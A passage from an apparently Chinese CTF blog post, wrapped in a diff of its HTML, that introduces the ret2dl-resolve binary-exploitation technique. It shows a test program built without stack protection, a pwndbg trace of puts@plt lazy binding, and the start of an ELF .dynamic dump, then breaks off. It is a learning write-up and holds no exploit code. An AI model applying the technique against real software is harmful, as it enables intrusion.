@@ -1,0 +1,1389 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.4.2" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=6.4.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.2" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.4.2',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="0x00：漏洞介绍ret2dl-resovle这种技术在pwn中的运用也挺多的，可以类比Windows下的IAT技术进行学习，了解这个技术之前，我们需要知道ELF文件中各个函数的加载过程，下面就演示一下GOT表是如何加载的，首先我们编译一个简单的程序 1234567#include &amp;lt;stdio.h&amp;gt;int main()&amp;#123;    puts(&quot;Hello Pwn\n&quot;);">
+<meta name="keywords" content="ret2-resolve">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2dl-resolve">
+<meta property="og:url" content="http://yoursite.com/2019/05/05/ret2dl-resolve/index.html">
+<meta property="og:site_name" content="Thunder_J">
+<meta property="og:description" content="0x00：漏洞介绍ret2dl-resovle这种技术在pwn中的运用也挺多的，可以类比Windows下的IAT技术进行学习，了解这个技术之前，我们需要知道ELF文件中各个函数的加载过程，下面就演示一下GOT表是如何加载的，首先我们编译一个简单的程序 1234567#include &amp;lt;stdio.h&amp;gt;int main()&amp;#123;    puts(&quot;Hello Pwn\n&quot;);">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-09-08T15:44:30.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ret2dl-resolve">
+<meta name="twitter:description" content="0x00：漏洞介绍ret2dl-resovle这种技术在pwn中的运用也挺多的，可以类比Windows下的IAT技术进行学习，了解这个技术之前，我们需要知道ELF文件中各个函数的加载过程，下面就演示一下GOT表是如何加载的，首先我们编译一个简单的程序 1234567#include &amp;lt;stdio.h&amp;gt;int main()&amp;#123;    puts(&quot;Hello Pwn\n&quot;);">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Thunder_J" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/05/05/ret2dl-resolve/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>ret2dl-resolve | Thunder_J</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+<a href="https://your-url" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Thunder_J</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">Just for fun</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/05/ret2dl-resolve/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Thunder_J">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Thunder_J">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ret2dl-resolve
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+		
+		
+
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-05-05 00:35:45" itemprop="dateCreated datePublished" datetime="2019-05-05T00:35:45+08:00">2019-05-05</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-08 23:44:30" itemprop="dateModified" datetime="2019-09-08T23:44:30+08:00">2019-09-08</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/题目篇/" itemprop="url" rel="index"><span itemprop="name">题目篇</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/题目篇/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/题目篇/PWN/栈/" itemprop="url" rel="index"><span itemprop="name">栈</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">17k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">15 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x00：漏洞介绍"><a href="#0x00：漏洞介绍" class="headerlink" title="0x00：漏洞介绍"></a>0x00：漏洞介绍</h1><p>ret2dl-resovle这种技术在pwn中的运用也挺多的，可以类比Windows下的IAT技术进行学习，了解这个技术之前，我们需要知道ELF文件中各个函数的加载过程，下面就演示一下GOT表是如何加载的，首先我们编译一个简单的程序</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hello Pwn\n"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"welcome\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//gcc -m32 -fno-stack-protector -no-pie -s helloworld.c</span></span><br></pre></td></tr></table></figure>
+<p>我们在puts函数下一个断点，观察是如何调用这个函数的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">thunder@thunder-PC:~/Desktop/CTF/pwn/ret2dl-resolve$ gdb a.out</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; b *0x080482e0</span><br><span class="line">Breakpoint 1 at 0x80482e0</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/thunder/Desktop/CTF/pwn/ret2dl-resolve/a.out </span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080482e0 <span class="keyword">in</span> puts@plt ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x8048500 ◂— dec    eax /* <span class="string">'Hello Pwn\n'</span> */</span><br><span class="line"> EBX  0x804a000 —▸ 0x8049f14 ◂— 0x1</span><br><span class="line"> ECX  0xffffd140 ◂— 0x1</span><br><span class="line"> EDX  0xffffd164 ◂— 0x0</span><br><span class="line"> EDI  0x0</span><br><span class="line"> ESI  0xf7fab000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d4d6c</span><br><span class="line"> EBP  0xffffd128 ◂— 0x0</span><br><span class="line"> ESP  0xffffd10c —▸ 0x804844f ◂— add    esp, 0x10</span><br><span class="line"> EIP  0x80482e0 (puts@plt) ◂— jmp    dword ptr [0x804a00c]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x80482e0  &lt;puts@plt&gt;                  jmp    dword ptr [0x804a00c]</span><br><span class="line"> </span><br><span class="line">   0x80482e6  &lt;puts@plt+6&gt;                push   0</span><br><span class="line">   0x80482eb  &lt;puts@plt+11&gt;               jmp    0x80482d0</span><br><span class="line">    ↓</span><br><span class="line">   0x80482d0                              push   dword ptr [0x804a004]</span><br><span class="line">   0x80482d6                              jmp    dword ptr [0x804a008] &lt;0xf7fead80&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7fead80 &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">   0xf7fead81 &lt;_dl_runtime_resolve+1&gt;     push   ecx</span><br><span class="line">   0xf7fead82 &lt;_dl_runtime_resolve+2&gt;     push   edx</span><br><span class="line">   0xf7fead83 &lt;_dl_runtime_resolve+3&gt;     mov    edx, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7fead87 &lt;_dl_runtime_resolve+7&gt;     mov    eax, dword ptr [esp + 0xc]</span><br><span class="line">   0xf7fead8b &lt;_dl_runtime_resolve+11&gt;    call   _dl_fixup &lt;0xf7fe4f30&gt;</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd10c —▸ 0x804844f ◂— add    esp, 0x10</span><br><span class="line">01:0004│      0xffffd110 —▸ 0x8048500 ◂— dec    eax /* <span class="string">'Hello Pwn\n'</span> */</span><br><span class="line">02:0008│      0xffffd114 —▸ 0xffffd1d4 —▸ 0xffffd385 ◂— <span class="string">'/home/thunder/Desktop/CTF/pwn/ret2dl-resolve/a.out'</span></span><br><span class="line">03:000c│      0xffffd118 —▸ 0xffffd1dc —▸ 0xffffd3b8 ◂— <span class="string">'QT_DBL_CLICK_DIST=15'</span></span><br><span class="line">04:0010│      0xffffd11c —▸ 0x804843a ◂— add    ebx, 0x1bc6</span><br><span class="line">05:0014│      0xffffd120 —▸ 0xffffd140 ◂— 0x1</span><br><span class="line">06:0018│      0xffffd124 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0  80482e0 puts@plt</span><br><span class="line">   f 1  804844f</span><br><span class="line">   f 2 f7deee81 __libc_start_main+241</span><br><span class="line">Breakpoint *0x80482e0</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">Hello Pwn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080482e0 <span class="keyword">in</span> puts@plt ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x804850b ◂— ja     0x8048572 /* <span class="string">'welcome\n'</span> */</span><br><span class="line"> EBX  0x804a000 —▸ 0x8049f14 ◂— 0x1</span><br><span class="line"> ECX  0x804b160 ◂— <span class="string">'\nello Pwn\n'</span></span><br><span class="line"> EDX  0xf7fac890 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDI  0x0</span><br><span class="line"> ESI  0xf7fab000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d4d6c</span><br><span class="line"> EBP  0xffffd128 ◂— 0x0</span><br><span class="line"> ESP  0xffffd10c —▸ 0x8048461 ◂— add    esp, 0x10</span><br><span class="line"> EIP  0x80482e0 (puts@plt) ◂— jmp    dword ptr [0x804a00c]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x80482e0  &lt;puts@plt&gt;    jmp    dword ptr [0x804a00c] &lt;0xf7e3d250&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7e3d250 &lt;puts&gt;        push   ebp</span><br><span class="line">   0xf7e3d251 &lt;puts+1&gt;      mov    ebp, esp</span><br><span class="line">   0xf7e3d253 &lt;puts+3&gt;      push   edi</span><br><span class="line">   0xf7e3d254 &lt;puts+4&gt;      push   esi</span><br><span class="line">   0xf7e3d255 &lt;puts+5&gt;      push   ebx</span><br><span class="line">   0xf7e3d256 &lt;puts+6&gt;      call   __x86.get_pc_thunk.di &lt;0xf7f0ad7d&gt;</span><br><span class="line"> </span><br><span class="line">   0xf7e3d25b &lt;puts+11&gt;     add    edi, 0x16dda5</span><br><span class="line">   0xf7e3d261 &lt;puts+17&gt;     sub    esp, 0x28</span><br><span class="line">   0xf7e3d264 &lt;puts+20&gt;     push   dword ptr [ebp + 8]</span><br><span class="line">   0xf7e3d267 &lt;puts+23&gt;     call   __strlen_ia32 &lt;0xf7e6e630&gt;</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd10c —▸ 0x8048461 ◂— add    esp, 0x10</span><br><span class="line">01:0004│      0xffffd110 —▸ 0x804850b ◂— ja     0x8048572 /* <span class="string">'welcome\n'</span> */</span><br><span class="line">02:0008│      0xffffd114 —▸ 0xffffd1d4 —▸ 0xffffd385 ◂— <span class="string">'/home/thunder/Desktop/CTF/pwn/ret2dl-resolve/a.out'</span></span><br><span class="line">03:000c│      0xffffd118 —▸ 0xffffd1dc —▸ 0xffffd3b8 ◂— <span class="string">'QT_DBL_CLICK_DIST=15'</span></span><br><span class="line">04:0010│      0xffffd11c —▸ 0x804843a ◂— add    ebx, 0x1bc6</span><br><span class="line">05:0014│      0xffffd120 —▸ 0xffffd140 ◂— 0x1</span><br><span class="line">06:0018│      0xffffd124 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0  80482e0 puts@plt</span><br><span class="line">   f 1  8048461</span><br><span class="line">   f 2 f7deee81 __libc_start_main+241</span><br><span class="line">Breakpoint *0x80482e0</span><br></pre></td></tr></table></figure>
+<p>可以发现，0x80482e6这个地址，并不直接是libc的puts函数的地址。这是因为linux在程序加载时使用了延迟绑定(lazy<br>load)，只有等到这个函数被调用了，才去把这个函数在libc的地址放到GOT表中。接下来，会再push一个0，再push一个dword ptr [0x804a004]，待会会说这两个参数是什么意思，最后跳到libc的_dl_runtime_resolve去执行。这个函数的目的，是根据2个参数获取到导出函数（这里是puts）的地址，然后放到相应的GOT表，并且调用它。而这个函数的地址也是从GOT表取并且jmp [xxx]过去的，但是这个函数不会延迟绑定，因为所有函数都是用它做的延迟绑定。而第二次调用puts函数则直接指向puts函数的地址，懂得了上面的东西，我们还需要知道一些结构体，类比PE文件的一些结构，用来索引一些结构。</p>
+<p><strong>.dynamic</strong></p>
+<p>dynamic结构包含了一些关于动态链接的关键信息，我们只需要关注<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>, <code>DT_JMPREL</code>这三个字段，这三个东西分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08049F14                   ; ELF Dynamic Information</span><br><span class="line">LOAD:08049F14                   ; ===========================================================================</span><br><span class="line">LOAD:08049F14</span><br><span class="line">LOAD:08049F14                   ; Segment type: Pure data</span><br><span class="line">LOAD:08049F14                   ; Segment permissions: Read/Write</span><br><span class="line">LOAD:08049F14                   LOAD segment mempage public &apos;DATA&apos; use32</span><br><span class="line">LOAD:08049F14                   assume cs:LOAD</span><br><span class="line">LOAD:08049F14 01 00 00 00 01 00+stru_8049F14 Elf32_Dyn &lt;1, &lt;1&gt;&gt;</span><br><span class="line">LOAD:08049F14 00 00                                           ; DATA XREF: LOAD:080480BC↑o</span><br><span class="line">LOAD:08049F14                                                 ; .got.plt:0804A000↓o</span><br><span class="line">LOAD:08049F14                                                 ; DT_NEEDED libc.so.6</span><br><span class="line">LOAD:08049F1C 0C 00 00 00 A8 82+Elf32_Dyn &lt;0Ch, &lt;80482A8h&gt;&gt;   ; DT_INIT</span><br><span class="line">LOAD:08049F24 0D 00 00 00 D4 84+Elf32_Dyn &lt;0Dh, &lt;80484D4h&gt;&gt;   ; DT_FINI</span><br><span class="line">LOAD:08049F2C 19 00 00 00 0C 9F+Elf32_Dyn &lt;19h, &lt;8049F0Ch&gt;&gt;   ; DT_INIT_ARRAY</span><br><span class="line">LOAD:08049F34 1B 00 00 00 04 00+Elf32_Dyn &lt;1Bh, &lt;4&gt;&gt;          ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:08049F3C 1A 00 00 00 10 9F+Elf32_Dyn &lt;1Ah, &lt;8049F10h&gt;&gt;   ; DT_FINI_ARRAY</span><br><span class="line">LOAD:08049F44 1C 00 00 00 04 00+Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt;          ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:08049F4C F5 FE FF 6F AC 81+Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:08049F54 05 00 00 00 1C 82+Elf32_Dyn &lt;5, &lt;804821Ch&gt;&gt;     ; DT_STRTAB</span><br><span class="line">LOAD:08049F5C 06 00 00 00 CC 81+Elf32_Dyn &lt;6, &lt;80481CCh&gt;&gt;     ; DT_SYMTAB</span><br><span class="line">LOAD:08049F64 0A 00 00 00 4A 00+Elf32_Dyn &lt;0Ah, &lt;4Ah&gt;&gt;        ; DT_STRSZ</span><br><span class="line">LOAD:08049F6C 0B 00 00 00 10 00+Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;        ; DT_SYMENT</span><br><span class="line">LOAD:08049F74 15 00 00 00 00 00+Elf32_Dyn &lt;15h, &lt;0&gt;&gt;          ; DT_DEBUG</span><br><span class="line">LOAD:08049F7C 03 00 00 00 00 A0+Elf32_Dyn &lt;3, &lt;804A000h&gt;&gt;     ; DT_PLTGOT</span><br><span class="line">LOAD:08049F84 02 00 00 00 10 00+Elf32_Dyn &lt;2, &lt;10h&gt;&gt;          ; DT_PLTRELSZ</span><br><span class="line">LOAD:08049F8C 14 00 00 00 11 00+Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;        ; DT_PLTREL</span><br><span class="line">LOAD:08049F94 17 00 00 00 98 82+Elf32_Dyn &lt;17h, &lt;8048298h&gt;&gt;   ; DT_JMPREL</span><br><span class="line">LOAD:08049F9C 11 00 00 00 90 82+Elf32_Dyn &lt;11h, &lt;8048290h&gt;&gt;   ; DT_REL</span><br><span class="line">LOAD:08049FA4 12 00 00 00 08 00+Elf32_Dyn &lt;12h, &lt;8&gt;&gt;          ; DT_RELSZ</span><br><span class="line">LOAD:08049FAC 13 00 00 00 08 00+Elf32_Dyn &lt;13h, &lt;8&gt;&gt;          ; DT_RELENT</span><br><span class="line">LOAD:08049FB4 FE FF FF 6F 70 82+Elf32_Dyn &lt;6FFFFFFEh, &lt;8048270h&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:08049FBC FF FF FF 6F 01 00+Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt;    ; DT_VERNEEDNUM</span><br><span class="line">LOAD:08049FC4 F0 FF FF 6F 66 82+Elf32_Dyn &lt;6FFFFFF0h, &lt;8048266h&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:08049FCC 00 00 00 00 00 00+Elf32_Dyn &lt;0&gt;                 